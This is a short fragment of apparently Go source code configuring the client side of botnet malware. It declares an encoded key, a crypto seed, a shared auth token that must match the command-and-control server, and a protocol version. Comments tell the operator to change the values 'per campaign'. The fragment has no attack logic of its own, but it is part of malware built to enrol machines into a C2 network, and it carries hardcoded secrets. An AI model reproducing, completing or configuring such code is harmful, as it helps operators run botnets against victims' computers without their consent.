...
const gothTits = "YzpTUoO7tbNAnqTfGU4/t99oVXy/LAMTVXalLRE=" //change me run setup.py

// cryptSeed is the 8-char hex seed used for key derivation.
const cryptSeed = "39f2717b" //change me run setup.py

// magicCode is the shared auth token — must match CNC.
const magicCode = "wM$hJABF&2oV@qky" //change this per campaign

// protocolVersion must match the CNC's protocol version string.
const protocolVersion = "v4.1" //change this per campaign
